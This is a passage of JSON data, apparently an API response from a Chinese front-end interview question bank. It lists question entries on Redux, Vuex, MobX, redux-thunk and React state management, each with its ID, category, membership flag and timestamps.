        "exerciseKey": "10e0441f-d709-427d-975b-f0026556ae7e",
        "title": "Redux 状态管理器和变量挂载到 window 中有什么区别？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-01-16T14:42:13.000Z",
        "updateAt": "2024-08-10T17:06:04.000Z"
      },
      {
        "exerciseKey": "14bf5712-b28f-41a0-852f-af40a342afde",
        "title": "Redux 和 Vuex 的设计思想是什么？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:36.000Z",
        "updateAt": "2024-08-14T23:43:44.000Z"
      },
      {
        "exerciseKey": "2476ee50-e484-4416-88a7-4c506f84de9a",
        "title": "Redux中的connect有什么作用？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-01-16T14:49:28.000Z",
        "updateAt": "2024-07-23T10:24:31.000Z"
      },
      {
        "exerciseKey": "453b0ac6-f8a2-44ed-af3f-eda8eaa0a70d",
        "title": "mobx 和 redux 有什么区别？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2022-01-16T14:45:28.000Z",
        "updateAt": "2024-08-10T19:53:12.000Z"
      },
      {
        "exerciseKey": "48ea6174-729d-4d41-ab63-eeaa3781068b",
        "title": "Redux 和 Vuex 有什么区别，它们有什么共同思想吗？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-01-16T14:46:59.000Z",
        "updateAt": "2024-07-23T10:24:53.000Z"
      },
      {
        "exerciseKey": "5438d05b-ec3b-42f6-8819-1f73213d654b",
        "title": "说说你对Redux的理解？其工作原理？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-10-24T04:26:31.000Z",
        "updateAt": "2024-08-10T17:05:54.000Z"
      },
      {
        "exerciseKey": "5a06e08f-c274-45c4-af4e-4281e1faea86",
        "title": "redux-thunk 和 redux 是什么关系？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:41.000Z",
        "updateAt": "2024-08-14T19:53:34.000Z"
      },
      {
        "exerciseKey": "5c4ea1e0-f1e4-4710-a5dd-e51277c83d9c",
        "title": "Redux 中异步的请求怎么处理",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-01-16T14:37:33.000Z",
        "updateAt": "2024-07-23T10:25:30.000Z"
      },
      {
        "exerciseKey": "746d796e-fd0c-44c7-b38f-00296bdfdde9",
        "title": "react 中，数组用useState做状态管理的时候，使用push，pop，splice等直接更改数组对象，会引起页面渲染吗？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:26.000Z",
        "updateAt": "2024-08-23T05:27:42.000Z"
      },
      {
        "exerciseKey": "89865bbd-72ac-4866-b4f6-a24f9c594d07",
        "title": "你在React项目中是如何使用Redux的? 项目结构是如何划分的？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-10-24T04:27:35.000Z",
        "updateAt": "2024-08-10T17:05:55.000Z"
      },
      {
        "exerciseKey": "c00d61b8-2609-40b9-8deb-a4fdb686e7c7",
        "title": "使用 redux 有哪些原则？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2023-02-19T06:55:33.000Z",
        "updateAt": "2024-08-10T19:52:15.000Z"
      }
    ]
  }
}